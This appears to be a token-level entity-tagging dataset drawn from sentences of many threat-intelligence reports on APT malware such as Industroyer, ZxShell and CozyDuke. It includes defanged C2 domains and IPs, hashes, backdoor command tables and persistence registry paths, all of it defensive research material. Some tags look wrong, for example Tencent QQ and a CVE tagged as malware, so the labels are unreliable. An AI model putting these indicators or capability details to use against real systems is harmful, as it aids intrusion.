of	O
the	O
Russian	O
Federation	O
and	O
are	O
believed	O
to	O
be	O
closely	O
linked	O
to	O
the	O
Russian	O
government	O
's	O
powerful	O
and	O
highly	O
capable	O
intelligence	O
services	O
.	O

We	O
encountered	O
the	O
first	O
document	O
exploit	O
called	O
'	O
THAM	O
luan-	O
GD-	O
NCKH2.doc	O
'	O
a	O
few	O
days	O
ago	O
,	O
which	O
appears	O
to	O
be	O
leveraging	O
some	O
vulnerabilities	O
patched	O
with	O
MS12-060	O
.	O

a3cbf6179d437909eb532b7319b3dafe	O
-	O
custom	O
keylogger	O
1369fee289fe7798a02cde100a5e91d8	O
-	O
UPX	O
compressed	O
'	O
dnsquery.exe	O
'	O
c0c03b71684eb0545ef9182f5f9928ca	O
-	O
dnsquery.exe	O

(	O
?	O
?	O
?	O

Take	O
steps	O
to	O
harden	O
both	O
Web	O
applications	O
and	O
the	O
servers	O
hosting	O
them	O
to	O
reduce	O
the	O
risk	O
of	O
network	O
intrusion	O
via	O
this	O
vector	O
.	O

At	O
the	O
same	O
time	O
,	O
the	O
main	O
instance	O
creates	O
six	O
named	O
pipes	O
using	O
the	O
very	O
same	O
GUID	O
.	O

Cyberspace	O
Research	O
Institute	O
of	O
Iran	O

IRONGATE	B-malware.backdoor
actively	O
records	O
and	O
plays	O
back	O
process	O
data	O
to	O
hide	O
manipulations	O
,	O
whereas	O
Stuxnet	O
did	O
not	O
attempt	O
to	O
hide	O
its	O
process	O
manipulation	O
,	O
but	O
suspended	O
normal	O
operation	O
of	O
the	O
S7-315	O
so	O
even	O
if	O
rotor	O
speed	O
had	O
been	O
displayed	O
on	O
the	O
HMI	O
,	O
the	O
data	O
would	O
have	O
been	O
static	O
.	O

This	O
function	O
implements	O
the	O
initial	O
handshake	O
which	O
consists	O
of	O
exchanging	O
16	O
bytes	O
,	O
0x00001985	O
and	O
0x00000425	O
,	O
with	O
the	O
server	O
.	O

The	O
framework	O
has	O
remained	O
in	O
use	O
since	O
initial	O
analyses	O
were	O
published	O
,	O
and	O
further	O
analysis	O
of	O
the	O
code	O
,	O
public	O
reporting	O
,	O
as	O
well	O
as	O
the	O
infrastructure	O
used	O
to	O
host	O
ScanBox	B-malware.infosteal
infections	O
has	O
given	O
us	O
a	O
better	O
picture	O
of	O
some	O
of	O
the	O
clusters	O
of	O
activity	O
we	O
identified	O
in	O
our	O
earlier	O
blog	O
.	O

The	O
dropped	O
implant	O
,	O
showppt.scr	O
(	O
MD5	O
:	O
165ac370b54e664812e4c15b2396ccd6	B-hash
)	O
,	O
is	O
a	O
downloader	O
that	O
connects	O
to	O
http[:]//199.91.173[.]45/	B-ip.unknown
and	O
downloads	O
both	O
legitimate	O
library	O
files	O
and	O
malicious	O
second	O
stage	O
binaries	O
.	O

They	O
will	O
be	O
able	O
to	O
steal	O
and	O
resell	O
in	O
the	O
underground	O
market	O
the	O
sensitive	O
data	O
of	O
each	O
victim	O
.	O

The	O
following	O
table	O
summarizes	O
the	O
main	O
C2	O
commands	O
supported	O
by	O
this	O
PowerShell	O
Script	O
.	O

All	O
the	O
files	O
described	O
here	O
,	O
whether	O
they	O
were	O
sent	O
in	O
an	O
email	O
or	O
downloaded	O
while	O
visiting	O
a	O
compromised	O
site	O
,	O
deliver	O
the	O
same	O
(	O
functionally	O
equivalent	O
)	O
backdoor	O
component	O
.	O

Figure	O
13	O
:	O
Popup	O
message	O
when	O
users	O
open	O
the	O
document	O
that	O
abuses	O
DDEAUTO	O
Figure	O
14	O
.	O

Command	O
'	O
exec	O
'	O
-	O
standard	O
process	O
creation	O
:	O

buffer	O
after	O
base64	O
decoding	O
:	O

This	O
campaign	O
also	O
targeted	O
South	O
Korean	O
college	O
students	O
interested	O
in	O
foreign	O
affairs	O
and	O
part	O
of	O
a	O
group	O
called	O
'	O
Friends	O
of	O
MOFA	O
'	O
(	O
Ministry	O
of	O
Foreign	O
Affairs	O
)	O
.	O

The	O
functionality	O
of	O
this	O
module	O
is	O
as	O
follows	O
:	O
calling	O
the	O
function	O
of	O
wininet	O
module	O
,	O
connecting	O
the	O
network	O
,	O
downloading	O
operations	O
of	O
module	O
2	O
;	O
and	O
executing	O
by	O
downloading	O
to	O
the	O
memory	O
.	O

Threat	O
Actor	O
Attribution	O
.................................................................................................................................................................................................................................................................................	O
17	O
Campaign	O
#	O
1	O
:	O
Moafee	B-malware.infosteal
..............................................................................................................................................................................................................................................................................	O
17	O
Campaign	O
#	O
2	O
:	O
DragonOK	B-malware.infosteal
................................................................................................................................................................................................................................................................	O
19	O

With	O
approximately	O
435,000	O
people	O
serving	O
clients	O
in	O
more	O
than	O
120	O
countries	O
,	O
Accenture	O
drives	O
innovation	O
to	O
improve	O
the	O
way	O
the	O
world	O
works	O
and	O
lives	O
.	O

Figure	O
2	O
represents	O
the	O
relationship	O
between	O
cyber	O
security	O
and	O
safety	O
controls	O
in	O
a	O
process	O
control	O
environment	O
.	O

C	O
&	O
C	O
:	O

All	O
trademarks	O
are	O
properties	O
of	O
their	O
respective	O
owners	O
.	O

by	O
CH	O
Lei	O
,	O
Fyodor	O
Yarochkin	O
,	O
Lenart	O
Bermejo	O
,	O
Philippe	O
Z	O
Lin	O
and	O
Razor	O
Huang	O

Decrypted	O
log	O
at	O
/var/tmp/.pipe.sock	O
Decrypted	O
log	O
at	O
/var/tmp/.pipe.sock	O

New	O
variants	O
of	O
Denis	O
and	O
Goopy	B-malware.backdoor
backdoors	O
PowerShell	O
Restriction	O
Bypass	O
Tool	O
–	O
Adapted	O
from	O
PSUnlock	O
Github	O
project	O
.	O

Win32/Industroyer	B-malware.backdoor
:	O
a	O
new	O
threat	O
for	O
industrial	O
control	O
systems	O
2	O
Main	O
backdoor	O
Additional	O
backdoor	O
4	O
Launcher	O
component	O
101	O
payload	O
component	O
6	O
104	O
payload	O
component	O
7	O
61850	O
payload	O
component	O
OPC	O
DA	O
payload	O
component	O
12	O
Data	O
wiper	O
component	O
Additional	O
tools	O
:	O
port	O
scanner	O
tool	O
14	O
Additional	O
tools	O
:	O
DoS	O
tool	O
15	O
Conclusion	O
15	O
Indicators	O
of	O
Compromise	O
(	O
IoC	O
)	O
Win32/Industroyer	B-malware.backdoor
is	O
a	O
sophisticated	O
piece	O
of	O
malware	O
designed	O
to	O
disrupt	O
the	O
working	O
processes	O
of	O
industrial	O
control	O
systems	O
(	O
ICS	O
)	O
,	O
specifically	O
industrial	O
control	O
systems	O
used	O
in	O
electrical	O
substations	O
Those	O
behind	O
the	O
Win32/Industroyer	B-malware.backdoor
malware	O
have	O
a	O
deep	O
knowledge	O
and	O
understanding	O
of	O
industrial	O
control	O
systems	O
and	O
,	O
specifically	O
,	O
the	O
industrial	O
protocols	O
used	O
in	O
electric	O
power	O
systems	O
Moreover	O
,	O
it	O
seems	O
very	O
unlikely	O
anyone	O
could	O
write	O
and	O
test	O
such	O
malware	O
without	O
access	O
to	O
the	O
specialized	O
equipment	O
used	O
in	O
the	O
specific	O
,	O
targeted	O
industrial	O
environment	O
Support	O
for	O
four	O
different	O
industrial	O
control	O
protocols	O
,	O
specified	O
in	O
the	O
standards	O
listed	O
below	O
,	O
has	O
been	O
implemented	O
by	O
the	O
malware	O
authors	O
:	O
IEC	O
60870-5-101	O
(	O
aka	O
IEC	O
101	O
)	O
IEC	O
60870-5-104	O
(	O
aka	O
IEC	O
104	O
)	O
IEC	O
61850	O
OLE	O
for	O
Process	O
Control	O
Data	O
Access	O
(	O
OPC	O
DA	O
)	O
In	O
addition	O
to	O
all	O
that	O
,	O
the	O
malware	O
authors	O
also	O
wrote	O
a	O
tool	O
that	O
implements	O
a	O
denial-of-service	O
(	O
DoS	O
)	O
attack	O
against	O
a	O
particular	O
family	O
of	O
protection	O
relays	O
,	O
specifically	O
the	O
Siemens	O
SIPROTEC	O
range	O
All	O
this	O
considered	O
,	O
the	O
Win32/Industroyer	B-malware.backdoor
malware	O
authors	O
show	O
an	O
intensive	O
focus	O
that	O
suggests	O
they	O
are	O
highly	O
specialized	O
in	O
industrial	O
control	O
systems	O
The	O
capabilities	O
of	O
this	O
malware	O
are	O
significant	O
When	O
compared	O
to	O
the	O
toolset	O
used	O
by	O
threat	O
actors	O
in	O
the	O
2015	O
attacks	O
against	O
the	O
Ukrainian	O
power	O
grid	O
which	O
culminated	O
in	O
a	O
black	O
out	O
on	O
December	O
23	O
,	O
2015	O
(	O
BlackEnergy	B-malware.unknown
,	O
KillDisk	B-malware.ransom
,	O
and	O
other	O
components	O
,	O
including	O
legitimate	O
remote	O
access	O
software	O
)	O
the	O
gang	O
behind	O
Industroyer	B-malware.backdoor
are	O
more	O
advanced	O
,	O
since	O
they	O
went	O
to	O
great	O
lengths	O
to	O
create	O
malware	O
capable	O
of	O
directly	O
controlling	O
switches	O
and	O
circuit	O
breakers	O
We	O
have	O
seen	O
indications	O
that	O
this	O
malware	O
could	O
have	O
been	O
the	O
tool	O
used	O
by	O
attackers	O
to	O
cause	O
the	O
power	O
outage	O
in	O
Ukraine	O
in	O
December	O
2016	O
,	O
although	O
at	O
the	O
time	O
of	O
writing	O
,	O
it	O
is	O
not	O
confirmed	O
,	O
and	O
the	O
investigation	O
is	O
still	O
ongoing	O
The	O
infection	O
vector	O
remains	O
unknown	O
The	O
malware	O
contains	O
multiple	O
modules	O
,	O
as	O
analyzed	O
and	O
described	O
in	O
the	O
next	O
sections	O
of	O
this	O
whitepaper	O
However	O
,	O
before	O
diving	O
into	O
those	O
details	O
,	O
the	O
following	O
simplified	O
schematic	O
shows	O
the	O
connections	O
between	O
the	O
components	O
of	O
the	O
malware	O
While	O
some	O
components	O
(	O
e	O
g	O
Data	O
wiper	O
)	O
are	O
similar	O
in	O
concept	O
to	O
the	O
2015	O
BlackEnergy	B-malware.unknown
attacks	O
against	O
power	O
grid	O
companies	O
in	O
Ukraine	O
,	O
we	O
do	O
n't	O
see	O
any	O
link	O
between	O
those	O
attacks	O
and	O
the	O
code	O
in	O
this	O
malware	O
We	O
refer	O
to	O
the	O
core	O
component	O
of	O
Industroyer	B-malware.backdoor
as	O
the	O
main	O
backdoor	O
The	O
main	O
backdoor	O
is	O
used	O
by	O
the	O
attackers	O
behind	O
Industroyer	B-malware.backdoor
to	O
control	O
all	O
other	O
components	O
of	O
the	O
malware	O
As	O
backdoors	O
go	O
,	O
this	O
component	O
is	O
pretty	O
straightforward	O
,	O
connecting	O
to	O
its	O
remote	O
C	O
&	O
C	O
server	O
using	O
HTTPS	O
and	O
receiving	O
commands	O
from	O
the	O
attackers	O
All	O
analyzed	O
samples	O
are	O
hardcoded	O
to	O
use	O
the	O
same	O
proxy	O
address	O
,	O
located	O
in	O
the	O
local	O
network	O
Thus	O
,	O
the	O
backdoor	O
is	O
clearly	O
designed	O
to	O
work	O
only	O
in	O
one	O
specific	O
organization	O
It	O
is	O
also	O
worth	O
mentioning	O
that	O
most	O
of	O
the	O
C	O
&	O
C	O
servers	O
used	O
by	O
this	O
backdoor	O
are	O
running	O
Tor	O
software	O
Perhaps	O
the	O
most	O
interesting	O
feature	O
of	O
this	O
backdoor	O
is	O
that	O
attackers	O
can	O
define	O
a	O
specific	O
hour	O
of	O
the	O
day	O
when	O
the	O
backdoor	O
will	O
be	O
active	O
For	O
example	O
,	O
the	O
attackers	O
can	O
modify	O
the	O
backdoor	O
in	O
this	O
way	O
so	O
it	O
will	O
communicate	O
with	O
its	O
C	O
&	O
C	O
server	O
only	O
outside	O
working	O
hours	O
This	O
can	O
make	O
detection	O
based	O
only	O
on	O
network	O
traffic	O
examination	O
harder	O
However	O
,	O
all	O
the	O
samples	O
analyzed	O
so	O
far	O
are	O
set	O
to	O
work	O
24	O
hours	O
round	O
the	O
clock	O
Once	O
connected	O
to	O
its	O
remote	O
C	O
&	O
C	O
server	O
,	O
the	O
main	O
backdoor	O
component	O
sends	O
the	O
following	O
data	O
in	O
a	O
POST-request	O
:	O
the	O
globally	O
unique	O
identifier	O
(	O
GUID	O
)	O
string	O
for	O
the	O
current	O
hardware	O
profile	O
retrieved	O
via	O
the	O
version	O
of	O
the	O
malware	O
:	O
1	O
1e	O
the	O
hardcoded	O
ID	O
of	O
the	O
sample	O
the	O
result	O
of	O
any	O
previously-received	O
command	O
The	O
hardcoded	O
ID	O
is	O
used	O
by	O
the	O
attacker	O
as	O
an	O
identifier	O
for	O
the	O
infected	O
machine	O
Across	O
all	O
analyzed	O
samples	O
we	O
found	O
the	O
following	O
hardcoded	O
ID	O
values	O
:	O
DEF-C	O
DEF-WS	O
DEF-EP	O
DC-2-TEMP	O
DC-2	O
CES-McA-TEMP	O
SRV_WSUS	O
SRV_DC-2	O
SCE-WSUS01	O
The	O
main	O
backdoor	O
component	O
supports	O
the	O
following	O
commands	O
:	O

This	O
document	O
pretends	O
to	O
be	O
a	O
press	O
report	O
and	O
contains	O
news	O
headlines	O
that	O
were	O
actually	O
copied	O
from	O
various	O
Palestinian	O
news	O
websites	O
.	O

Service	O
Key	O
&	O
Value	O
Note	O
:	O
deleted	O
after	O
drop	O
Path	O
to	O
backdoor	O
Note	O
:	O
deleted	O
after	O
stage	O
1	O
Path	O
to	O
backdoor	O
Note	O
:	O
persistent	O
SOFTWARE\Microsoft\Windows	O
NT\	O
CurrentVersion\SvcHost\	O

It	O
's	O
worth	O
noting	O
that	O
the	O
function	O
names	O
used	O
in	O
the	O
PostScript	O
are	O
transliterated	O
Chinese	O
words	O
.	O

TABLE	O
3	O
:	O
COZYDUKE	B-malware.drop
MODULES	O
Module	O
Type	O

The	O
UDP	O
and	O
TCP	O
volumetric	O
floods	O
are	O
quite	O
unremarkable	O
and	O
simply	O
consist	O
of	O
random	O
gibberish	O
blasted	O
at	O
a	O
target	O
host	O
and	O
port	O
.	O

If	O
the	O
active	O
window	O
is	O
Tencent	B-malware.drop
QQ	I-malware.drop
(	O
specifically	O
,	O
QQ2009	B-malware.drop
through	O
QQ2012	B-malware.drop
)	O
,	O
EvilGrab	B-malware.drop
will	O
attempt	O
to	O
steal	O
information	O
by	O
directly	O
reading	O
the	O
process	O
's	O
memory	O
and	O
checking	O
if	O
the	O
class	O
name	O
of	O
the	O
focused	O
window	O
is	O
not	O
named	O
'	O
EDIT	O
.	O
'	O

Microsoft	O
has	O
fixed	O
the	O
vulnerability	O
and	O
named	O
it	O
CVE-2018-8174	B-malware.unknown
.	O

To	O
effectively	O
defend	O
against	O
the	O
threats	O
described	O
in	O
this	O
report	O
,	O
iDefense	O
recommends	O
blocking	O
access	O
to	O
the	O
following	O
C2	B-url.unknown
domains	I-url.unknown
and	O
IP	O
addresses	O
:	O
firefoxcomt.arkouowi[.]com	B-url.cncsvr
update.arkouowi[.]com	B-url.cncsvr
friendlysupport.giize[.]com	B-url.cncsvr
algorithm.ddnsgeek[.]com	B-url.cncsvr
149.36.63[.]65	O
83.136.106[.]108	O
Hashes	O
(	O
SHA-256	O
)	O
:	O

안다리엘	O
그룹은	O
2016년	O
8월부터	O
백신	O
관리	O
프로그램의	O
취약점을	O
이용해	O
군사	O
관련	O
기관	O
내부를	O
공격해	O
군사	O
정보를	O
유출한다	O
.	O

Figure	O
4	O
:	O
RATANKBA	B-malware.backdoor
main	O
console	O
interface	O
Figure	O
5	O
:	O
RATANKBA	B-malware.backdoor
host	O
manipulation	O
console	O

Since	O
the	O
group	O
's	O
emergence	O
in	O
2007	O
,	O
Bitdefender	O
has	O
become	O
familiar	O
with	O
the	O
backdoors	O
used	O
to	O
compromise	O
Windows	O
and	O
Linux	O
targets	O
,	O
such	O
as	O
Coreshell	O
,	O
Jhuhugit	O
and	O
Azzy	O
for	O
the	O
former	O
OS	O
or	O
Fysbis	O
for	O
the	O
latter	O
.	O

Office	O
2016.exe	O
edikvlxhprg.lnk	O
edikvlxhprg.exe	O
plugin.exe	O
Fared-Ismael.rar	O

If	O
some	O
of	O
these	O
are	O
detected	O
,	O
it	O
quits	O
its	O
execution	O
.	O

PowerShell	O
Environment	O
Variables	O
:	O
Nowadays	O
,	O
malware	O
authors	O
commonly	O
mask	O
critical	O
strings	O
such	O
as	O
'	O
IEX	O
'	O
using	O
environment	O
variables	O
.	O

function	O
is	O
located	O
at	O
0x01437036	O
in	O
our	O
case	O
.	O

Accepted	O
payment	O
methods	O
are	O
the	O
usual	O
virtual	O
currencies	O
and	O
pre-paid	O
options	O
.	O

www.FireEye.com	B-url.normal

The	O
FireEye	O
Threat	O
Prevention	O
Platform	O
provides	O
real-time	O
,	O
dynamic	O
threat	O
protection	O
without	O
the	O
use	O
of	O
signatures	O
to	O
protect	O
an	O
organization	O
across	O
the	O
primary	O
threat	O
vectors	O
,	O
including	O
Web	O
,	O
email	O
,	O
and	O
files	O
and	O
across	O
the	O
different	O
stages	O
of	O
an	O
attack	O
life	O
cycle	O
.	O

After	O
having	O
described	O
Dino	B-malware.backdoor
's	O
basics	O
,	O
we	O
are	O
now	O
going	O
to	O
dig	O
into	O
two	O
particularly	O
interesting	O
components	O
;	O
first	O
,	O
a	O
custom	O
file	O
system	O
used	O
by	O
the	O
malware	O
,	O
and	O
then	O
the	O
CRONTAB	O
module	O
in	O
charge	O
of	O
task	O
scheduling	O
.	O

While	O
WhiteBear	O
is	O
Turla	O
related	O
,	O
it	O
is	O
interesting	O
to	O
compare	O
to	O
other	O
ongoing	O
development	O
styles	O
.	O

So	O
,	O
the	O
malware	O
does	O
not	O
have	O
any	O
clever	O
persistence	O
features	O
either	O
.	O

If	O
it	O
is	O
actually	O
malicious	O
,	O
it	O
is	O
possible	O
the	O
code	O
could	O
be	O
re-activated	O
at	O
any	O
time	O
.	O

and	O
how	O
the	O
malware	O
communicates	O
with	O
its	O
C	O
&	O
C	O
servers	O
.	O

Here	O
is	O
list	O
of	O
commands	O
that	O
it	O
can	O
receive	O
from	O
C	O
&	O
C	O
server	O
:	O
Command	O
Purpose	O
0x02	O
0x03	O
0x04	O
0x05	O
0x06	O
0x07	O
0x08	O
Collects	O
information	O
about	O
computer	O
:	O
Computer	O
Name	O
,	O
User	O
Name	O
,	O
Windows	O
Version	O
,	O
Architecture	O
(	O
32/64	O
bit	O
)	O
and	O
campaign	O
ID	O
Collects	O
list	O
of	O
running	O
processes	O
Downloads	O
binary	O
to	O
%	O
TEMP	O
%	O
and	O
executes	O
Updates	O
itself	O
Deletes	O
itself	O
Makes	O
screenshot	O
Loads	O
binary	O
in	O
the	O
memory	O
,	O
without	O
dropping	O
to	O
the	O
disk	O
The	O
latest	O
sample	O
of	O
this	O
malware	O
family	O
found	O
in	O
the	O
wild	O
is	O
also	O
digitally	O
signed	O
with	O
a	O
different	O
certificate	O
:	O
The	O
certificate	O
details	O
:	O
Company	O
name	O
:	O
In	O
travel	O
TOV	O
Validity	O
:	O
from	O
21	O
July	O
2015	O
to	O
21	O
July	O
2016	O
Thumbprint	O
:	O
7809fbd8d24949124283b9ff14d12da497d9c724	O
Serial	O
number	O
:	O
00dfd915e32c5f3181a0cdf0aff50f8052	O
Subject	O
:	O
CN	O
=	O
In	O
travel	O
TOV	O
O	O
=	O
In	O
travel	O
TOV	O
STREET	O
=	O
prospekt	O
Pravdi	O
33	O
L	O
=	O
Kiev	O
S	O
=	O
Kievskaja	O
PostalCode	O
=	O
04108	O
C	O
=	O
UA	O
Also	O
,	O
the	O
latest	O
sample	O
is	O
able	O
to	O
gain	O
system	O
privileges	O
via	O
an	O
exploit	O
and	O
install	O
itself	O
as	O
a	O
system	O
service	O
.	O

After	O
inspecting	O
the	O
njRAT	B-malware.backdoor
builder	O
kit	O
it	O
was	O
determined	O
that	O
this	O
individual	O
customized	O
the	O
existing	O
njRAT	B-malware.backdoor
builder	O
kit	O
to	O
bypass	O
security	O
products	O
.	O

pcon.exe	O
,	O
portc.exe	O
,	O
zcon.exe	O
등의	O
파일	O
이름으로	O
IP와	O
포트를	O
확인하는	O
도구도	O
사용했다	O
.	O

CreateMutexA	O
is	O
183	O
(	O
\xB7	O
)	O
,	O
which	O
corresponds	O
to	O
'	O
ERROR_ALREADY_EXISTS	O
'	O
9	O
.	O

But	O
the	O
decision	O
by	O
the	O
attacker	O
to	O
use	O
a	O
widely	O
known	O
security	O
application	O
as	O
an	O
embedded	O
decoy	O
is	O
a	O
slightly	O
more	O
sophisticated	O
ploy	O
to	O
the	O
average	O
user	O
or	O
to	O
a	O
less	O
experienced	O
systems	O
administrator	O
.	O

https://www.facebook.com/%D8%AA%D9%85%D8%B1%D8%AF-%D8%A7%D9%84%D8%B6%D9%81%D8%	B-url.normal
A9-%D8%A7%D9%84%D8%BA%D8%B1%D8%A8%D9%8A%D8%A9-542062199177072/	I-url.normal

McAfee	O
Policy	O
Auditor	O
SCAP	O
MNAC	O
SCAP	O

One	O
such	O
email	O
,	O
shown	O
in	O
Figure	O
2	O
and	O
used	O
by	O
the	O
DragonOK	B-malware.infosteal
group	O
was	O
written	O
in	O
traditional	O
Chinese	O
,	O
and	O
targeted	O
a	O
Taiwanese	O
technology	O
firm	O
The	O
primary	O
observed	O
attack	O
vector	O
used	O
by	O
both	O
groups	O
is	O
spear-phishing	O
emails	O
.	O

Killkill	O
:	O
S	O
tops	O
the	O
backdoor	O
's	O
activities	O

NOV	O
(	O
2015	O
)	O
JULY	O
18	O
AUG	O
4	O

Additionally	O
,	O
CozyDuke	B-malware.drop
may	O
utilize	O
a	O
technique	O
known	O
as	O
COM-object	O
hijacking	O
to	O
establish	O
persistence	O
.	O

35	O
million	O
users	O
months	O

Eventually	O
the	O
hackers	O
will	O
implant	O
backdoor	O
Trojan	B-malware.backdoor
to	O
completely	O
control	O
the	O
computer	O
.	O

SYSTEM\CurrentControlSet\Services\	O
RaS	O
?	O
?	O

If	O
the	O
file	O
system	O
is	O
not	O
recognized	O
then	O
it	O
is	O
possible	O
that	O
the	O
MBR	O
will	O
need	O
to	O
be	O
reconstructed	O
,	O
though	O
this	O
is	O
unlikely	O
.	O

The	O
following	O
lists	O
three	O
points	O
.	O

The	O
real	O
malicious	O
code	O
is	O
running	O
in	O
the	O
background	O
as	O
Android	O
service	O
.	O

Further	O
analysis	O
is	O
on-going	O
to	O
understand	O
the	O
history	O
of	O
this	O
malware	O
variant	O
.	O

45.114.117[.]137	B-ip.unknown
)	O
ID2016.doc	O
bfb3ca77d95d4f34982509380f2f146f63aa41bc	B-hash
2016-11-23	O
08:18:43	O
Malicious	O
Word	O
document	O
(	O
Phishing	O
text	O
in	O
Vietnamese	O
)	O
blog(.)versign(.)info	B-url.cncsvr
(	O
23.227.196[.]210	B-ip.unknown
)	O
blog(.)versign(.)info	B-url.cncsvr
(	O
23.227.196[.]210	B-ip.unknown
)	O
tx32.dll	O
604a1e1a6210c96e50b72f025921385fad943ddf	B-hash
2016-08-15	O
04:04:46	O

At	O
this	O
stage	O
,	O
the	O
malware	O
gathers	O
information	O
about	O
the	O
infected	O
computer	O
.	O

These	O
targets	O
include	O
some	O
in	O
academia	O
which	O
have	O
received	O
military	O
funding	O
for	O
their	O
research	O
projects	O
relating	O
to	O
unmanned	O
vehicles	O
.	O

The	O
BBC	O
.	O

'	O
ghijklmnop	O
'	O
(	O
'	O
UTF-16LE	O
'	O
)	O
(	O
'	O
hex	O
'	O
)	O
0x2f	O
<	O
(	O
)	O
<	O
0x3a	O
:	O
0x30	O
]	O

In	O
addition	O
,	O
comprehensive	O
security	O
solutions	O
can	O
be	O
used	O
to	O
protect	O
organizations	O
from	O
attacks	O
.	O

After	O
analyzing	O
the	O
fake	O
Kik	B-malware.drop
Messenger	I-malware.drop
app	O
,	O
we	O
spotted	O
the	O
spyware	O
,	O
or	O
Advanced	O
Persistent	O
Threat	O
(	O
APT	O
)	O
.	O

The	O
Sofacy	O
modules	O
at	O
this	O
system	O
appeared	O
to	O
never	O
touch	O
disk	O
,	O
and	O
resemble	O
the	O
Linux	O
Fysbis	O
code	O
.	O

In	O
order	O
to	O
analyze	O
the	O
dropper	O
,	O
we	O
patched	O
it	O
.	O

JPCERT/CC	O
has	O
been	O
observing	O
malicious	O
shortcut	O
files	O
that	O
are	O
sent	O
as	O
email	O
attachments	O
to	O
a	O
limited	O
range	O
of	O
organisations	O
since	O
around	O
October	O
2015	O
.	O

After	O
it	O
connects	O
to	O
the	O
tcp	O
port	O
,	O
it	O
will	O
get	O
4	O
bytes	O
to	O
apply	O
for	O
a	O
memory	O
.	O

In	O
the	O
past	O
weeks	O
on	O
6	O
August	O
2016	O
,	O
Cyberkov	O
Security	O
Incident	O
Response	O
Team	O
(	O
CSIRT	O
)	O
received	O
a	O
numerous	O
Android	O
malwares	O
operating	O
in	O
different	O
areas	O
in	O
Libya	O
especially	O
in	O
Tripoli	O
and	O
Benghazi	O
.	O

Moreover	O
,	O
besides	O
Mohamad	B-malware.unknown
potentially	O
being	O
the	O
name	O
of	O
the	O
malware	O
developer	O
(	O
based	O
on	O
PDB	O
string	O
found	O
in	O
multiple	O
samples	O
:	O
C	O
:	O
\Users\	O
\Desktop\AM\programming\C\tsDownloader\Release\tsDownloader.pdb	O
)	O
,	O
we	O
do	O
not	O
have	O
evidence	O
that	O
the	O
attackers	O
are	O
Arabs	O
.	O

After	O
gathering	O
same	O
hash	O
from	O
the	O
OpenSSL	O
library	O
,	O
we	O
could	O
import	O
symbols	O
for	O
the	O
matched	O
functions	O
.	O

The	O
PCC_PROXY	O
:	O
:ProcessPacket	O

Here	O
we	O
have	O
some	O
screenshots	O
that	O
show	O
the	O
Server	O
and	O
the	O
ZxShell	B-malware.backdoor
Keylogger	O
in	O
action	O
:	O
Our	O
server	O
has	O
accepted	O
a	O
connection	O
from	O
a	O
remote	O
host	O
The	O
ZxShell	B-malware.backdoor
keylogger	O
has	O
captured	O
2	O
user	O
passwords	O
(	O
gmail.com	O
and	O
amazon.com	O
)	O
The	O
last	O
image	O
shows	O
a	O
very	O
interesting	O
feature	O
of	O
the	O
ZxShell	B-malware.backdoor
keylogger	O
:	O
once	O
installed	O
and	O
activated	O
,	O
the	O
keylogger	O
is	O
able	O
to	O
catch	O
each	O
password	O
that	O
the	O
user	O
inserts	O
in	O
the	O
login	O
box	O
of	O
each	O
website	O
(	O
like	O
Google	O
,	O
Amazon	O
and	O
so	O
on	O
...	O
)	O
.	O

Child	O
Type	O
:	O
StringFileInfo	O
Language/Code	O
Page	O
:	O
1033/1200	O
CompanyName	O
:	O
Microsoft	O
Corporation	O
FileDescription	O
:	O
Cdto	O
Netware	O
2.12	O
Provider	O
FileVersion	O
:	O
5.1.2600.0	O
(	O
xpclient.010817-­‐1148	O
)	O
InternalName	O
:	O
NEWCDTO	O
LegalCopyright	O
:	O
Microsoft	O
Corporation	O
.	O

So	O
,	O
when	O
the	O
user	O
is	O
opening	O
any	O
.HWP	O
document	O
,	O
the	O
malware	O
program	O
itself	O
is	O
executed	O
to	O
open	O
the	O
.HWP	O
document	O
.	O

There	O
are	O
probably	O
several	O
actors	O
that	O
could	O
have	O
an	O
interest	O
in	O
the	O
regional	O
politics	O
,	O
as	O
the	O
various	O
powerblocks	O
in	O
the	O
region	O
are	O
manifold	O
and	O
conflicted	O
.	O

Following	O
are	O
the	O
hashes	O
of	O
the	O
exploit	O
file	O
:	O

ZxShell	B-malware.backdoor
(	O
aka	O
Sensocode	O
)	O
is	O
a	O
Remote	B-malware.drop
Administration	I-malware.drop
Tool	I-malware.drop
(	O
RAT	B-malware.drop
)	O
used	O
by	O
Group	O
72	O
to	O
conduct	O
cyber-espionage	O
operations	O
.	O

In	O
their	O
current	O
campaign	O
,	O
APT32	B-malware.infosteal
has	O
leveraged	O
ActiveMime	O
files	O
that	O
employ	O
social	O
engineering	O
methods	O
to	O
entice	O
the	O
victim	O
into	O
enabling	O
macros	O
.	O

Figure	O
20	O
.	O

Prior	O
research	O
revealed	O
607	O
domains	O
related	O
to	O
Appin	O
which	O
we	O
were	O
able	O
to	O
link	O
via	O
historical	O
passive	O
DNS	O
to	O
1345	O
IPs	O
.	O

Sanitize	O
and	O
validate	O
input	O
to	O
ensure	O
that	O
it	O
is	O
properly	O
typed	O
and	O
does	O
not	O
contain	O
escaped	O
code	O
.	O

We	O
have	O
reported	O
this	O
'	O
creative	O
'	O
abuse	O
of	O
DDE	O
to	O
Microsoft	O
's	O
security	O
team	O
.	O

Some	O
methods	O
of	O
attack	O
are	O
listed	O
below	O
.	O

s.bind	O
(	O
(	O
'	O
0.0.0.0	O
'	O
,	O
443	O
)	O
)	O
26	O
.	O

Android.Lastacloud	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-4334-99	B-url.cncsvr
)	O
BBOS.Lastacloud	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121913-0103-99	B-url.cncsvr
)	O
IOS.Lastacloud	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-5858-99	B-url.cncsvr
)	O

The	O
IRONGATE	B-malware.backdoor
samples	O
stood	O
out	O
based	O
on	O
their	O
references	O
to	O
SCADA	O
and	O
associated	O
functionality	O
.	O

e5b781ec77472d8d4b3b4a4d2faf5761	B-hash

Profile	O
of	O
the	O
Attackers	O

We	O
devised	O
a	O
different	O
fingerprinting	O
technique	O
and	O
scanned	O
portions	O
of	O
the	O
internet	O
.	O

Disable	O
,	O
discontinue	O
,	O
or	O
disallow	O
the	O
use	O
of	O
Internet	O
Control	O
Message	O
Protocol	O
(	O
ICMP	O
)	O
and	O
Simple	O
Network	O
Management	O
Protocol	O
(	O
SNMP	O
)	O
and	O
response	O
to	O
these	O
protocols	O
as	O
much	O
as	O
possible	O
.	O

4	O
.	O

So	O
to	O
summarize	O
,	O
DarkComet	B-malware.backdoor
uses	O
a	O
hard-coded	O
(	O
although	O
different	O
for	O
each	O
version	O
)	O
preliminary	O
key	O
string	O
,	O
such	O
as	O

It	O
is	O
interesting	O
to	O
note	O
that	O
